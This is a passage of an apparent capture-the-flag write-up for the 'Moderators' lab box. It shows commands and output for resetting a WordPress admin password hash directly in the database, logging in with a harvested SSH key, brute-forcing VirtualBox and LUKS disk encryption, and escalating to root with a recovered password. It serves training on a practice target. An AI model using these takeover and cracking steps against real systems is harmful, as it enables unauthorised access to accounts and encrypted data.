<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">wordpress</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> UPDATE <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_users</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span> SET <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_pass</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'$P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/'</span> WHERE user_login = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'admin'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb24-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.002</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb24-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
<span id="cb24-4"></span>
<span id="cb24-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">wordpress</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from wp_users<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb24-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb24-7"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$P$Butw21NZp</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bVFKSgE6gbBKtLjkl3tQ/</span> </span></code></pre></div>
<p>Set up a new SSH tunnel and login through <code>http://127.0.0.1:8080/wp-login.php</code>. Trying to login we’re forwarded to <code>http://moderators.htb:8080/xxx</code> and trying to edit <code>moderators.htb</code> to <code>127.0.0.1</code> invalidate the login. So edit <code>/etc/hosts</code> and add <code>moderators.htb</code> to <code>127.0.0.1</code>.</p>
<p>Try to login again and everything works as intended: <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators11.png" class="img-fluid"></p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>At the bottom of the nav bar we find the second plugin <em>“PWDMS”</em>, check it out and we find the credentials <code>carl:Carl@thebest**</code> as well as <code>john</code>’s private SSH key..</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators12.png" class="img-fluid"></p>
<p>Copy the private key and re-format it, myself I use <a href="https://www.samltool.com/format_privatekey.php">samltool.com</a> for this purpose.</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators vim john-id_rsa </span>
<span id="cb25-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators chmod 400 john-id_rsa               </span>
<span id="cb25-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ssh john@10.10.11.173 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> john-id_rsa</span>
<span id="cb25-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john@moderators:~$</span> id</span>
<span id="cb25-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1002</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Doing some manual enumeration as <code>john</code> we find internal conversation logs talking about password policies and vbox etc:</p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john@moderators:~/stuff/exp$</span> strings <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span></code></pre></div>
<p>We find the encrypted <em>.vdi</em> as well as the informational <em>.vbox</em> files:</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john@moderators:~/stuff/VBOX$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb27-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 118800</span>
<span id="cb27-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 john john      4096 Jul 14 10:50 .</span>
<span id="cb27-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 john john      4096 Jul 14 10:50 ..</span>
<span id="cb27-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 john john      5705 Sep 18  2020 2019-08-01.vbox</span>
<span id="cb27-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 john john 121634816 Sep 18  2020 2019.vdi</span>
<span id="cb27-7"></span>
<span id="cb27-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john@moderators:~/stuff/VBOX$</span> cat 2019-08-01.vbox</span>
<span id="cb27-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb27-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>VirtualBox <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">xmlns</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://www.virtualbox.org/"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">version</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.16-windows"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-11">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Machine <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{528b3540-b8be-4677-b43f-7f4969137747}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Moderator 1"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">OSType</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Ubuntu_64"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">snapshotFolder</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Snapshots"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">lastStateChange</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2021-09-15T16:44:57Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-12">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>MediaRegistry<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-13">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-14">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisk <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"F:/2019.vdi"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VDI"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Normal"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-15">          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Property <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CRYPT/KeyId"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">value</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Moderator 1"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb27-16">          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Property <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CRYPT/KeyStore"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">value</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g=="</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>The KeyStore seems interesting, and investigating we quickly find that we can crack it using <a href="https://github.com/axcheron/pyvboxdie-cracker">pyvboxdie-cracker</a>:</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  pyvboxdie-cracker git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">master</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">✗</span> python3 pyvboxdie-cracker.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> /htb/moderators/2019-08-01.vbox <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> wordlist.txt                   </span>
<span id="cb28-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> pyvboxdie-cracker...</span>
<span id="cb28-3"></span>
<span id="cb28-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Encrypted drive found :  F:/2019.vdi</span>
<span id="cb28-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> KeyStore information...</span>
<span id="cb28-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Algorithm</span> = AES-XTS256-PLAIN64</span>
<span id="cb28-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Hash</span> = PBKDF2-SHA256</span>
<span id="cb28-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Final</span> Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f</span>
<span id="cb28-9"></span>
<span id="cb28-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Starting bruteforce...</span>
<span id="cb28-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">19</span> password tested...</span>
<span id="cb28-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49</span> password tested...</span>
<span id="cb28-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">67</span> password tested...</span>
<span id="cb28-14"></span>
<span id="cb28-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Password Found = computer</span></code></pre></div>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Download the <em>.vdi</em> to your local machine and VirtualBox if you don’t already have it. I use my Windows box where I have VirtualBox already installed. Add the <em>.vbox</em> file to create the new machine <em>“Moderator 1”</em>. In the settings status we see that it’s missing <em>Ubuntu.vdi</em> and <em>2019.vdi</em>:</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators13.png" class="img-fluid"></p>
<p>Instead of removing and adding new drives, open remove the machine <code>Moderator 1</code> and edit <code>2019-08-01.vbox</code>, change the location of the disks to whatever suits you.</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-2">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisk <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"D:\2019.vdi"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VDI"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Normal"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-3">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb29-4">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisk <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Ubuntu.vdi"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VDI"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Normal"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-5">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/HardDisks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-6">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>DVDImages<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-7">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Image <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{7653d755-c513-4004-8891-be83fc130dba}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"D:\ubuntu-22.04-desktop-amd64.iso"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb29-8">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/DVDImages<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Add the machine again and it should now detect <em>2019.vdi</em>, if it doesn’t you may need to restart VirtualBox.</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators14.png" class="img-fluid"></p>
<p>We’re still not able to start the box, because of this <em>Ubuntu.vdi</em>, so lets just remove it from the <em>2019-08-01.vbox</em> file.. delete these line:</p>
<div class="sourceCode" id="cb30" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>HardDisk <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Ubuntu.vdi"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VDI"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Normal"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb30-3">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>DVDImages<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-4">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Image <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{7653d755-c513-4004-8891-be83fc130dba}"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">location</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"F:/ubuntu-22.04-desktop-amd64.iso"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-5">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/DVDImages<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb30-7">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>AttachedDevice <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HardDisk"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">hotpluggable</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"false"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">device</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-8">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Image <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uuid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb30-9">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/AttachedDevice<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>I was stuck here for a while, even when mounting a new ubuntu ISO and booting I got nowhere.. then I remembered the disk is crypted, but already we have the password - <code>computer</code> Add it to the configurations and try again. Note that you need <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox Extension Pack</a> to be able to edit this..</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators15.png" class="img-fluid"></p>
<p>Now when booting we’re able to choose “Try or Install Ubuntu”: <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators16.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators17.png" class="img-fluid"></p>
<p>Running <code>fdisk -l</code> and <code>df -h</code> we see that <code>/dev/sda</code> is not mounted, this is our disk <code>2019.vdi</code>. Mount it!</p>
<div class="sourceCode" id="cb31" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ubuntu@ubuntu:~$</span> sudo fdisk <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span></span>
<span id="cb31-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb31-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Disk</span> model: VBOX HARDDISK</span>
<span id="cb31-4"></span>
<span id="cb31-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ubuntu@ubuntu:~$</span> df <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span></span>
<span id="cb31-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ubuntu@ubuntu:~$</span> sudo mount /dev/sda /tmp</span>
<span id="cb31-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mount:</span> /tmp: unknown filesystem type <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'crypto_LUKS'</span></span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators18.png" class="img-fluid"></p>
</section>
<section id="step-4-1" class="level3">
<h3 class="anchored" data-anchor-id="step-4-1">Step 4</h3>
<p>Looking for ways to handle the LUKS encryption I find a few brute force tools, download and install <a href="https://github.com/glv2/bruteforce-luks">bruteforce-luks</a> on the Virtual Box VM and get at it. Very quickly we get the password - <code>abc123</code></p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators19.png" class="img-fluid"></p>
<p>The disk only contains a directory named <code>scripts</code>, and within a set of subfolders. In the directory <code>all-in-one</code> there is one script with a timestamp that’s not like the others - <code>distro_update.sh</code> Look in the script and we find a password, probably for user <code>john</code> - <code>$_THE_best_Sysadmin_Ever_</code></p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators20.png" class="img-fluid"></p>
<div class="sourceCode" id="cb32" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">john@moderators:~/stuff/VBOX$</span> sudo su</span>
<span id="cb32-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[sudo]</span> password for john: <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_THE_best_Sysadmin_Ever_</span></span>
<span id="cb32-3"></span>
<span id="cb32-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@moderators:/home/john/stuff/VBOX#</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /root/root.txt <span class="kw" style="color: #003B4F;
background-color: null;
